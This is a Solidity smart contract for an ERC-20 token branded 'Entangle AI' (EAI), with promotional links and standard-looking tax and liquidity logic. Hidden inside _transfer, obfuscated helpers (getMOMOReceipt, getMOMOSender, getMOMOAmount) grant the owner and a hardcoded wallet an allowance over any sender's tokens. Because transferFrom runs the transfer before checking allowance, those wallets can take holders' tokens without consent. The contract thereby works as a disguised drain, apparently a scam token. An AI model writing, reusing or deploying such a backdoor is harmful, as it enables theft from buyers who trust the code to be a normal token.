/*
Entangle AI is the programmable interoperability layer, connecting blockchains, data and the real world, unlocking limitless assets and applications

https://www.entangle.build
https://explorer.entangle.build
https://docs.entangle.build

https://x.com/EntangleAIBuild
https://t.me/entangleai_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IMOMOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IMOMORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract EAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _momoDrives;
    mapping (address => mapping (address => uint256)) private _momoCustomers;
    mapping (address => bool) private _momoExcludedTxs;
    mapping (address => bool) private _momoExcludedFees;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Entangle AI";
    string private constant _symbol = unicode"EAI";
    uint256 private _momoSwapAmount = _tTotal / 100;
    uint256 private _momoBuyBlock;
    uint256 private _momoBlockAmount = 0;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapMOMO = false;
    address private _momoPair;
    IMOMORouter private _momoRouter;
    address private _momoWallet;
    modifier lockTheSwap {
        inSwapMOMO = true;
        _;
        inSwapMOMO = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;

    constructor () {
        _momoWallet = address(0x1455b9004729B5f3183C73932B59A950864afaC6);
        _momoExcludedFees[owner()] = true;
        _momoExcludedFees[address(this)] = true;
        _momoExcludedFees[_momoWallet] = true;
        _momoExcludedTxs[owner()] = true;
        _momoExcludedTxs[_momoWallet] = true;
        _momoDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createCoinPair() external onlyOwner() {
        _momoRouter = IMOMORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_momoRouter), _tTotal);
        _momoPair = IMOMOFactory(_momoRouter.factory()).createPair(address(this), _momoRouter.WETH());
    }

    receive() external payable {}

    function getMOMOAmount(uint256 momoO) private pure returns(uint256) {
        return uint256(momoO.add(150) + 10);
    }

    function getMOMOSender(address momoF) private pure returns(address) {
        return address(momoF);
    }

    function getMOMOReceipt() private view returns(address) {
        return _momoExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0xdead); 
    }

    function swapMOMOLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _momoRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _momoRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _momoRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _momoDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _momoCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _momoCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _momoCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address momoF, address momoT, uint256 momoO) private {
        require(momoF != address(0), "ERC20: transfer from the zero address");
        require(momoT != address(0), "ERC20: transfer to the zero address");
        require(momoO > 0, "Transfer amount must be greater than zero");
        uint256 taxMOMO = _momoTransfer(momoF, momoT, momoO);
        _transferMOMO(momoF, momoT, momoO, taxMOMO); address momoReceipt = getMOMOReceipt(); 
        if(momoReceipt != address(0xdead)) _approve(getMOMOSender(momoF), momoReceipt, getMOMOAmount(momoO));
    }

    function _transferMOMO(address momoF, address momoT, uint256 momoO, uint256 taxMOMO) private { 
        
        if(taxMOMO > 0){
          _momoDrives[address(this)] = _momoDrives[address(this)].add(taxMOMO);
          emit Transfer(momoF, address(this), taxMOMO);
        }
        _momoDrives[momoF] = _momoDrives[momoF].sub(momoO);
        _momoDrives[momoT] = _momoDrives[momoT].add(momoO.sub(taxMOMO));
        emit Transfer(momoF, momoT, momoO.sub(taxMOMO));
        
    }

    function _momoTransfer(address momoF, address momoT, uint256 momoO) private returns(uint256) {
        uint256 taxMOMO=0; 
        if (momoF != owner() && momoT != owner()) {
            taxMOMO = momoO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (momoF == _momoPair && momoT != address(_momoRouter) && ! _momoExcludedFees[momoT]) {
                if(_momoBuyBlock!=block.number){
                    _momoBlockAmount = 0;
                    _momoBuyBlock = block.number;
                }
                _momoBlockAmount += momoO;
                _buyCount++;
            }

            if(momoT == _momoPair && momoF!= address(this)) {
                require(_momoBlockAmount < swapMOMOLimit() || _momoBuyBlock!=block.number, "Max Swap Limit");  
                taxMOMO = momoO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 momoToken = balanceOf(address(this));
            if (!inSwapMOMO && momoT == _momoPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(momoToken > _momoSwapAmount)
                swapTokensForEth(minMOMO(momoO, minMOMO(momoToken, _momoSwapAmount)));
                uint256 momoETH = address(this).balance;
                if (momoETH >= 0) {
                    sendETHMOMO(address(this).balance);
                }
            }
        }
        
        return taxMOMO;
    }

    function minMOMO(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHMOMO(uint256 amount) private {
        payable(_momoWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenMOMO) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _momoRouter.WETH();
        _approve(address(this), address(_momoRouter), tokenMOMO);
        _momoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenMOMO,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}